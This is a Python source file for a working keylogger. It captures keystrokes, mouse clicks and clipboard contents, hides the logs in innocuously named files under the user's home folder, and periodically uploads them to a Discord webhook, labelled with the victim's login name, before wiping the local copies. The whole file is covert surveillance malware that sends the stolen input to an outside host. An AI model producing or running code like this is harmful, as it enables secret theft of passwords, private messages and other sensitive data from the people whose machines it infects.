from pynput import keyboard, mouse
from pathlib import Path
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
import os
import hashlib
import pyperclip

controller = mouse.Controller()

max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
clear_after_send = True
settings_name = "Source/main.dependencies"
input_log_name = "Source/main.x"
clipboard_log_name = "Source/main.extensions"
kill_switch_name = "Source/kill"
clip = ""

def kill_switch():
    file_path = Path.home() / kill_switch_name
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if file_path.exists():
        return True

def generate_color(name):
    hashed_name = hashlib.md5(name.encode('utf-8')).hexdigest()
    r = int(hashed_name[0:2], 16)
    g = int(hashed_name[2:4], 16)
    b = int(hashed_name[4:6], 16)
    return "{:02X}{:02X}{:02X}".format(r, g, b)

user_color = generate_color(os.getlogin())

def check_if_should_send(lines):
    if lines >= max_lines:
        webhook = DiscordWebhook(url=url, username="Keys")
        file_path = Path.home() / input_log_name
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with file_path.open('r') as file:
            contents = file.read()
            webhook.add_file(file=contents, filename="keys.txt")
            lines = contents.splitlines()
            filtered_lines = [line for line in lines if line.startswith(" Pressed:")]
            filtered_content = "\n".join(filtered_lines)
            webhook.add_file(file=filtered_content, filename="presses.txt")

        try:
            file_path = Path.home() / clipboard_log_name
            file_path.parent.mkdir(parents=True, exist_ok=True)
            with file_path.open('r') as file:
                webhook.add_file(file=file.read(), filename="clipboard.txt")
        except:
            pass
        embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=user_color)
        embed.set_timestamp()
        webhook.add_embed(embed)
        if clear_after_send:
            file_path = Path.home() / input_log_name
            file_path.parent.mkdir(parents=True, exist_ok=True)
            with file_path.open('w') as file:
                file.write("")
            try:
                file_path = Path.home() / clipboard_log_name
                file_path.parent.mkdir(parents=True, exist_ok=True)
                with file_path.open('w') as file:
                    file.write("")
            except:
                pass
        webhook.execute()

def ascii_replace(key):
    try:
        if str(key) == "Button.left":
            return "Mouse 1"
        elif str(key) == "Button.right":
            return "Mouse 2"
        elif str(key) == "Button.middle":
            return "Mouse 3"
        elif str(key) == "Button.x1":
            return "Mouse 4"
        elif str(key) == "Button.x2":
            return "Mouse 5"
        elif str(key) == "<12>":
            return "numpad 5"
        elif str(key) == "<48>":
            return 0
        elif str(key) == "<49>":
            return 1
        elif str(key) == "<50>":
            return 2
        elif str(key) == "<51>":
            return 3
        elif str(key) == "<52>":
            return 4
        elif str(key) == "<53>":
            return 5
        elif str(key) == "<54>":
            return 6
        elif str(key) == "<55>":
            return 7
        elif str(key) == "<56>":
            return 8
        elif str(key) == "<57>":
            return 9
        elif str(key) == "<106>":
            return "numpad *"
        elif str(key) == "<107>":
            return "numpad +"
        elif str(key) == "<109>":
            return "numpad -"
        elif str(key) == "<111>":
            return "numpad /"
        elif str(key) == "<186>":
            return ";"
        elif str(key) == "<187>":
            return "="
        elif str(key) == "<188>":
            return ","
        elif str(key) == "<189>":
            return "-"
        elif str(key) == "<190>":
            return "."
        elif str(key) == "<191>":
            return "/"
        elif str(key) == "<192>":
            return "`"
        elif str(key) == "<222>":
            return "'"
        else:
            try: 
                key = key.name
            except:
                key = key.char
            
            if '\x01' in key:
                return "a"
            elif '\x02' in key:
                return "b"
            elif '\x03' in key:
                return "c"
            elif '\x04' in key:
                return "d"
            elif '\x05' in key:
                return "e"
            elif '\x06' in key:
                return "f"
            elif '\x07' in key:
                return "g"
            elif '\x08' in key:
                return "h"
            elif '\t' in key:
                return "i"
            elif '\n' in key:
                return "j"
            elif '\x0b' in key:
                return "k"
            elif '\x0c' in key:
                return "l"
            elif '\r' in key:
                return "m"
            elif '\x0e' in key:
                return "n"
            elif '\x0f' in key:
                return "o"
            elif '\x10' in key:
                return "p"
            elif '\x11' in key:
                return "q"
            elif '\x12' in key:
                return "r"
            elif '\x13' in key:
                return "s"
            elif '\x14' in key:
                return "t"
            elif '\x15' in key:
                return "u"
            elif '\x16' in key:
                return "v"
            elif '\x17' in key:
                return "w"
            elif '\x18' in key:
                return "x"
            elif '\x19' in key:
                return "y"
            elif '\x1a' in key:
                return "z"
            elif '\x1b' in key:
                return "["
            elif '\x1c' in key:
                return "\\"
            elif '\x1d' in key:
                return "]"
            else:
                return key
    except:
        return key

def on_press(key):
    # key press monitoring and logging
    key_name = ascii_replace(key)

    log = f" Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}\n"

    file_path = Path.home() / input_log_name
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log)
    else:
        with file_path.open('a') as file:
            file.write(log)

def on_release(key):
    global clip
    # Key release monitor and logging
    key_name = ascii_replace(key)

    log = f"Released: {str(key_name).rjust(max_length)} | {datetime.now()}\n"

    file_path = Path.home() / input_log_name
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log)
        lines = 0
    else:
        with file_path.open('r+') as file:
            file.write(log)
            lines = len(file.readlines())
    
    # clipboard monitor and logging
    try:
        if str(clip) != pyperclip.paste():
            clip = pyperclip.paste()
            log = f"{datetime.now()} :\n{str(clip)}\n\n"

            file_path = Path.home() / clipboard_log_name
            file_path.parent.mkdir(parents=True, exist_ok=True)

            if not file_path.exists():
                file_path.write_text(log)
            else:
                with file_path.open('a') as file:
                    file.write(log)
    except:
        pass

    check_if_should_send(lines)

    if kill_switch():
        controller.click(mouse.Button.left)
        webhook = DiscordWebhook(url=url, username="Keys")
        embed = DiscordEmbed(title=f"Keyboard: Killswitch activated for user: {os.getlogin()}", color=user_color)
        webhook.add_embed(embed)
        webhook.execute()
        return False

def on_click(x, y, button, pressed):
    # mouse click monitor and logging
    if pressed:
        coords = f"{x}, {y}"
        log = f"{ascii_replace(button).rjust(8)}: {str(coords).rjust(max_length)} | {datetime.now()}\n"
        file_path = Path.home() / input_log_name
        file_path.parent.mkdir(parents=True, exist_ok=True)

        if not file_path.exists():
            file_path.write_text(log)
        else:
            with file_path.open('a') as file:
                file.write(log)
    
    if kill_switch():
        webhook = DiscordWebhook(url=url, username="Keys")
        embed = DiscordEmbed(title=f"Mouse: Killswitch activated for user: {os.getlogin()}", color=user_color)
        webhook.add_embed(embed)
        webhook.execute()
        return False

if not kill_switch():
    file_path = Path.home() / settings_name
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if file_path.exists():
        try:
            with file_path.open('r') as file:
                url = file.readline().replace("\n","").strip()
                max_lines = int(file.readline())
            webhook = DiscordWebhook(url=url, username="Keys")
            embed = DiscordEmbed(title=f"Connected to user: {os.getlogin()}", color=user_color)
            webhook.add_embed(embed)
            response = webhook.execute()

            if response.status_code != 401:
                keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
                mouse_listener = mouse.Listener(on_click=on_click)

                keyboard_listener.start()
                mouse_listener.start()

                keyboard_listener.join()
                mouse_listener.join()
        except:
            pass
